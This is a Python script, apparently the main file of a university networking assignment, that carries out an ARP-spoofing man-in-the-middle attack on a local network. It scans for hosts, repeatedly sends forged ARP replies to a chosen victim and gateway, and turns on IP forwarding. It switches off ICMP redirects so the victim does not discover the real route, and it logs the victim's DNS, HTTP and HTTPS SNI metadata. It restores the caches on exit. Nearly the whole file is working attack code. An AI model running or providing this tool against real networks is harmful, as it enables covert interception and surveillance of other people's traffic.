#!/usr/bin/env python3
"""Aplicacao MITM por ARP Spoofing (Trabalho Final - PUCRS, Redes 2026/2).

Posiciona a maquina atacante entre uma Vitima e o Gateway da rede local por meio
de envenenamento de cache ARP, mantem o encaminhamento de pacotes transparente e
audita passivamente os metadados do trafego web (DNS, HTTP e o SNI do HTTPS).
Toda manipulacao de pacotes e feita com raw sockets (AF_PACKET) e decodificacao
propria -- SEM Scapy, arpspoof, libpcap ou equivalentes.

                 (1) ARP Request broadcast -> descobre nos ativos
   Vitima  <----  (2) ARP Reply forjado: "gateway esta no MAC do atacante"
   Gateway <----  (2) ARP Reply forjado: "vitima esta no MAC do atacante"
   Atacante ----> (3) encaminha (ip_forward) e (4) audita via raw socket
                  (5) Ctrl-C -> rajada de ARP legitimo restaura as caches

Arquitetura concorrente (detalhes em docs/arquitetura.md):
    - thread envenenador : reenvia os ARP Reply forjados a cada `intervalo`
    - thread capturador  : so faz recv() no raw socket e enfileira os quadros
    - thread processador : decodifica, correlaciona e persiste (consumidor)
    - thread principal   : painel TUI + tratamento de sinais + self-healing

Uso tipico (dentro do container atacante, como root):
    python3 mitm.py --iface eth0 --vitima 172.10.20.2 --gateway 172.10.20.1
    python3 mitm.py --iface eth0           # descobre e pergunta os alvos
"""
import argparse
import os
import queue
import signal
import socket
import sys
import threading
import time

import arp
from decoders import mac_para_texto
import interceptador
import tui

CAMINHO_IP_FORWARD = "/proc/sys/net/ipv4/ip_forward"


# ---- Ajuste de sysctls do kernel (ip_forward + ICMP redirects) -------------
def _ler_sysctl(caminho):
    try:
        with open(caminho) as f:
            return f.read().strip()
    except OSError:
        return None


def _escrever_sysctl(caminho, valor):
    try:
        with open(caminho, "w") as f:
            f.write(str(valor))
        return True
    except OSError as e:
        print(f"[!] nao consegui ajustar {caminho}: {e}", file=sys.stderr)
        return False


class SysctlTemporario:
    """Salva o valor atual de cada sysctl, aplica o novo e restaura no fim.

    Usado para o `ip_forward` e, importante, para desligar os ICMP redirects do
    atacante: ao repassar um pacote pela mesma interface por onde ele chegou, o
    kernel tende a mandar um ICMP redirect avisando a vitima da rota "melhor"
    (direto para o gateway real), o que desfaz o desvio do MITM. Desligar
    `send_redirects` (em `all` e na interface) evita isso; tudo e restaurado no
    encerramento.
    """

    def __init__(self):
        self.anteriores = {}

    def aplicar(self, caminho, valor):
        if caminho not in self.anteriores:
            self.anteriores[caminho] = _ler_sysctl(caminho)
        _escrever_sysctl(caminho, valor)

    def restaurar(self):
        for caminho, valor in self.anteriores.items():
            if valor is not None:
                _escrever_sysctl(caminho, valor)


# ---- Selecao de alvos -------------------------------------------------------
def escolher_alvos(hosts, args):
    """Resolve vitima e gateway a partir dos argumentos ou de selecao interativa."""
    mapa = {h["ip"]: h["mac"] for h in hosts}

    def mac_de(ip):
        return mapa.get(ip)

    if args.vitima and args.gateway:
        return args.vitima, mac_de(args.vitima), args.gateway, mac_de(args.gateway)

    if not hosts:
        sys.exit("Nenhum host ativo encontrado na sub-rede. Verifique a interface.")

    print("\nNos ativos descobertos na sub-rede:")
    for i, h in enumerate(hosts):
        print(f"  [{i}] {h['ip']:<15} {h['mac']}")
    if not sys.stdin.isatty():
        sys.exit("Sem terminal interativo: informe --vitima e --gateway.")
    try:
        iv = int(input("Indice da VITIMA  : ").strip())
        ig = int(input("Indice do GATEWAY : ").strip())
    except (ValueError, EOFError):
        sys.exit("Selecao invalida.")
    v, g = hosts[iv], hosts[ig]
    return v["ip"], v["mac"], g["ip"], g["mac"]


# ---- Threads ----------------------------------------------------------------
def laco_envenenador(sock_envio, meu_mac, vitima, mac_vitima, gateway,
                     mac_gateway, intervalo, estado, parar):
    """Reenvia periodicamente os dois ARP Reply forjados (persistencia do desvio)."""
    veneno_vitima = arp.quadro_de_veneno(meu_mac, gateway, mac_vitima, vitima)
    veneno_gateway = arp.quadro_de_veneno(meu_mac, vitima, mac_gateway, gateway)
    while not parar.is_set():
        try:
            sock_envio.send(veneno_vitima)   # diz a vitima: gateway = meu MAC
            sock_envio.send(veneno_gateway)  # diz ao gateway: vitima = meu MAC
        except OSError as e:
            print(f"[!] falha ao enviar ARP forjado: {e}", file=sys.stderr)
        with estado.lock:
            estado.arp["rajadas"] += 1
            estado.arp["ativo"] = True
        parar.wait(intervalo)


def laco_capturador(sock_captura, fila, parar, meu_mac):
    """Produtor: so le quadros do raw socket e enfileira (trabalho minimo).

    Enfileira apenas os quadros efetivamente ENDERECADOS ao atacante no nivel 2
    (MAC destino == meu MAC). Com as caches envenenadas, os dois sentidos do
    fluxo da vitima chegam com esse MAC destino -- enquanto as copias que o
    proprio kernel reenvia (ip_forward) saem com MAC destino do gateway/vitima e
    seriam contadas em dobro. O filtro de L2 elimina essa duplicata.
    """
    sock_captura.settimeout(0.5)
    while not parar.is_set():
        try:
            frame = sock_captura.recv(65535)
        except socket.timeout:
            continue
        except OSError:
            break
        if len(frame) >= 6 and frame[:6] == meu_mac:
            fila.put((frame, time.time()))


def curar(sock_envio, meu_mac_txt, vitima, mac_vitima, gateway, mac_gateway,
          rajadas=5, intervalo=0.2):
    """Self-healing: reanuncia os MACs verdadeiros aos dois extremos."""
    print("\n[*] restaurando tabelas ARP (self-healing)...", flush=True)
    cura_vitima = arp.quadro_de_cura(mac_gateway, gateway, mac_vitima, vitima)
    cura_gateway = arp.quadro_de_cura(mac_vitima, vitima, mac_gateway, gateway)
    for _ in range(rajadas):
        try:
            sock_envio.send(cura_vitima)
            sock_envio.send(cura_gateway)
        except OSError:
            pass
        time.sleep(intervalo)


def main():
    p = argparse.ArgumentParser(
        description="MITM por ARP Spoofing + auditoria de metadados web (raw socket)")
    p.add_argument("--iface", default="eth0", help="interface de rede (padrao eth0)")
    p.add_argument("--vitima", help="IP da vitima (se omitido, descobre e pergunta)")
    p.add_argument("--gateway", help="IP do gateway (se omitido, descobre e pergunta)")
    p.add_argument("--intervalo", type=float, default=2.0,
                   help="segundos entre rajadas de ARP forjado (padrao 2)")
    p.add_argument("--timeout-scan", type=float, default=3.0,
                   help="duracao da varredura ARP de descoberta (padrao 3s)")
    p.add_argument("--dir-saida", default="resultados",
                   help="diretorio dos arquivos de log/resumo")
    p.add_argument("--sem-forward", action="store_true",
                   help="NAO ativar ip_forward (demonstra o blackhole do Experimento 3)")
    args = p.parse_args()

    if not hasattr(socket, "AF_PACKET"):
        sys.exit("AF_PACKET indisponivel: esta aplicacao so roda em Linux.")

    # 1) Socket e identidade local
    try:
        sock_captura = arp.abrir_socket(args.iface)
        sock_envio = arp.abrir_socket(args.iface)
    except PermissionError:
        sys.exit("Permissao negada: execute como root (CAP_NET_RAW).")
    except OSError as e:
        sys.exit(f"Nao consegui abrir a interface {args.iface}: {e}")

    meu_mac = arp.obter_mac(args.iface)
    meu_mac_txt = mac_para_texto(meu_mac)
    meu_ip = arp.obter_ip(args.iface)
    mascara = arp.obter_mascara(args.iface)
    print(f"[*] interface {args.iface}  ip={meu_ip}  mac={meu_mac_txt}  "
          f"mascara={mascara}")

    # 2) Descoberta de nos ativos (varredura ARP)
    print(f"[*] varrendo a sub-rede via ARP ({args.timeout_scan}s)...")
    hosts = arp.descobrir_hosts(sock_captura, args.iface, meu_ip, meu_mac,
                                mascara, timeout=args.timeout_scan)

    vitima, mac_vitima, gateway, mac_gateway = escolher_alvos(hosts, args)
    # MACs podem faltar se os alvos vieram por argumento: resolve na marra
    if not mac_vitima:
        mac_vitima = arp.resolver_mac(sock_envio, args.iface, meu_ip, meu_mac, vitima)
    if not mac_gateway:
        mac_gateway = arp.resolver_mac(sock_envio, args.iface, meu_ip, meu_mac, gateway)
    if not mac_vitima or not mac_gateway:
        sys.exit("Nao consegui resolver o MAC de vitima e/ou gateway.")
    print(f"[*] VITIMA  {vitima} -> {mac_vitima}")
    print(f"[*] GATEWAY {gateway} -> {mac_gateway}")

    # 3) Ajustes de kernel: ip_forward + desligar ICMP redirects (restaurados
    #    no encerramento). Os redirects, se ligados, avisariam a vitima da rota
    #    real e desfariam o ataque.
    sysctls = SysctlTemporario()
    for caminho in ("/proc/sys/net/ipv4/conf/all/send_redirects",
                    f"/proc/sys/net/ipv4/conf/{args.iface}/send_redirects"):
        sysctls.aplicar(caminho, 0)
    if args.sem_forward:
        sysctls.aplicar(CAMINHO_IP_FORWARD, 0)
        print("[!] ip_forward=0 (modo blackhole: a vitima perde conectividade)")
    else:
        sysctls.aplicar(CAMINHO_IP_FORWARD, 1)
        print("[*] ip_forward=1; ICMP send_redirects desligado")

    # 4) Estado compartilhado + persistencia
    estado = interceptador.EstadoCompartilhado()
    with estado.lock:
        estado.arp.update({
            "vitima": vitima, "gateway": gateway,
            "mac_vitima": mac_vitima, "mac_gateway": mac_gateway,
            "meu_mac": meu_mac_txt, "intervalo": args.intervalo,
        })
    persist = interceptador.Persistencia(dir_saida=args.dir_saida)
    print(f"[*] log:    {persist.caminho_log}")
    print(f"[*] resumo: {persist.caminho_csv}")

    # 5) Threads: envenenador, capturador, processador
    fila = queue.Queue(maxsize=10000)
    parar = threading.Event()

    threads = [
        threading.Thread(target=laco_envenenador, name="envenenador",
                         args=(sock_envio, meu_mac, vitima, mac_vitima, gateway,
                               mac_gateway, args.intervalo, estado, parar),
                         daemon=True),
        threading.Thread(target=laco_capturador, name="capturador",
                         args=(sock_captura, fila, parar, meu_mac), daemon=True),
        threading.Thread(target=interceptador.laco_processador, name="processador",
                         args=(fila, estado, persist, vitima, parar), daemon=True),
    ]
    for t in threads:
        t.start()

    # 6) Sinais -> encerramento limpo
    def encerrar(signum, frame):
        parar.set()
    signal.signal(signal.SIGINT, encerrar)
    signal.signal(signal.SIGTERM, encerrar)

    print("[*] ataque ativo. abrindo painel em 1s (Ctrl-C para encerrar)...")
    time.sleep(1)

    # 7) Painel na thread principal (bloqueia ate parar)
    try:
        tui.laco_tui(estado, parar)
    except KeyboardInterrupt:
        parar.set()

    # 8) Encerramento: para threads, cura ARP, restaura ip_forward, fecha arquivos
    for t in threads:
        t.join(timeout=3)
    # Self-healing: a vitima/gateway foram envenenados pelo laco_envenenador
    # (que roda sempre, inclusive no modo --sem-forward), entao a cura das caches
    # ARP tambem precisa rodar sempre -- requisito 3.3 (restauracao obrigatoria,
    # imediata e limpa). So a restauracao do ip_forward depende do modo, e ela ja
    # e coberta por sysctls.restaurar().
    curar(sock_envio, meu_mac_txt, vitima, mac_vitima, gateway, mac_gateway)
    sysctls.restaurar()
    print("[*] sysctls restaurados (ip_forward, send_redirects)")
    persist.salvar_resumo(estado)
    persist.fechar()

    with estado.lock:
        print(f"\n[resumo] pacotes={estado.total_pacotes} dns={estado.total_dns} "
              f"http={estado.total_http} tls={estado.total_tls} "
              f"bytes={estado.total_bytes} destinos={len(estado.destinos)}")
    print(f"[resumo] evidencias em {persist.caminho_log} e {persist.caminho_csv}")
    sock_captura.close()
    sock_envio.close()


if __name__ == "__main__":
    main()
